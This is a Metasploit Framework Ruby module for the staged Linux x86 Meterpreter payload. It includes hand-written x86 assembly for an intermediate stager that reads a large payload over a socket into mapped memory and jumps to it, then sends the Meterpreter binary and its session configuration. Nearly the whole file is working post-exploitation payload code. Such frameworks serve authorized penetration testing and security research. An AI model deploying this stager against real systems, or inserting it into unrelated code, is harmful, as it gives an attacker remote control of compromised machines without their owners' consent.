##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/meterpreter_x86_linux'
require 'msf/base/sessions/meterpreter_options'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Meterpreter',
      'Description'   => 'Inject the meterpreter server payload (staged)',
      'Author'        => ['PKS', 'egypt', 'OJ Reeves'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Linux))

    register_options([
      OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
    ], self.class)
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
    ep = elf.elf_header.e_entry
    return ep
  end

=begin
  def elf2bin(payload)
    # XXX, not working. Use .c version

    # This code acts as a mini elf parser / memory layout linker.
    # It will return what a elf file looks like once loaded in memory

    mem = "\x00" * (4 * 1024 * 1024)
    used = 0

    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )

    elf.program_header.each { |hdr|
      if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD)
        print_status("Found PT_LOAD")
        fileidx = hdr.p_offset & (~4095)
        memidx = (hdr.p_vaddr & (~4095)) - elf.base_addr
        len = hdr.p_filesz + (hdr.p_vaddr & 4095)

        mem[memidx,memidx+len] = payload[fileidx,fileidx+len] # should result in a single memcpy call :D
        used += (hdr.p_memsz + (hdr.p_vaddr & 4095) + 4095) & ~4095
      end
    }

    # Maybe at some stage zero out elf header / program headers in case tools
    # try to look for them

    print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
    return mem[0, used]
  end
=end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)
    config_offset = payload.length - generate_meterpreter.length

    encoded_entry = "0x%.8x" % entry_offset
    encoded_offset = "0x%.8x" % config_offset
    encoded_debug_options = "0x%.2x" % datastore['DebugOptions'].to_i

    # Maybe in the future patch in base.

    # Does a mmap() / read() loop of a user specified length, then
    # jumps to the entry point (the \x5a's)
    midstager_asm = %Q^
      midstager:
        and esp, 0xFFFFF254
        push 0x4
        pop edx
        mov ecx, esp
        mov ebx, edi
        push 0x3
        pop eax
        int 0x80
        push edi
        mov eax, 0xC0
        mov ebx, 0x20040000
        mov ecx, dword ptr [esp+0x4]
        push 0x7
        pop edx
        push 0x32
        pop esi
        xor edi, edi
        mov ebp, edi
        dec edi
        int 0x80
        cmp eax, 0xFFFFFF7F
        jb start_read
      terminate:
        xor eax, eax
        inc eax
        int 0x80                                 ; sys_exit
      start_read:
        xchg ecx, edx
        xchg ecx, ebx
        pop ebx
      read_loop:
        push 0x3
        pop eax
        int 0x80                                ; sys_read
        cmp eax, 0xFFFFFF7F
        ja terminate                            ; exit on error
        test eax, eax
        je terminate                            ; exit on error
        add ecx, eax
        sub edx, eax
        jne read_loop                           ; read more
        ; edx should be at the end, but we need to adjust for the size of the config
        ; block so we know where to write the socket to memory
        sub ecx, #{encoded_offset}
        mov [ecx], ebx                          ; write the socket to the config
        push #{encoded_debug_options}
        push ecx                                ; pass in the configuration pointer
        mov eax, #{encoded_entry}               ; put the entry point in eax
        call eax
        jmp terminate
    ^

    midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string

    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
    conn.put(midstager)
    Rex::ThreadSafe.sleep(1.5)

    # Send length of payload
    conn.put([ payload.length ].pack('V'))
    return true

  end

  def generate_stage(opts={})
    meterpreter = generate_meterpreter
    config = generate_config(opts)
    meterpreter + config
  end

  def generate_meterpreter
    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      :arch       => opts[:uuid].arch,
      :exitfunk   => nil,
      :expiration => datastore['SessionExpirationTimeout'].to_i,
      :uuid       => opts[:uuid],
      :transports => [transport_config(opts)],
      :extensions => [],
      :ascii_str  => true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end
end
